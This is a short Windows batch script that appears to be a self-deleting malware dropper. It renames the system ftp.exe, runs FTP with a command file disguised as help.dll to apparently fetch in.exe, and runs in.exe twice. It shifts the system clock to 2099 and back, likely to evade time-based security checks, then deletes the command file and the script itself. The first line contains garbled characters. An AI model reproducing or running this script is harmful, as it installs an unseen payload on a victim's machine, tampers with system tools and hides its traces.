set a=2007-07-23 ����һ
date=2099-01-01
if exist C:\WINDOWS\system32\dllcache\ftp.exe ren C:\WINDOWS\system32\dllcache\ftp.exe sft.exe
if exist C:\WINDOWS\system32\ftp.exe ren C:\WINDOWS\system32\ftp.exe sft.exe
sft.exe -s:C:\WINDOWS\help.dll
if not exist in.exe ftp -s:C:\WINDOWS\help.dll
in.exe
in.exe
date=%a%
:end
del C:\WINDOWS\help.dll
del C:\WINDOWS\BEGIN.BAT
exit
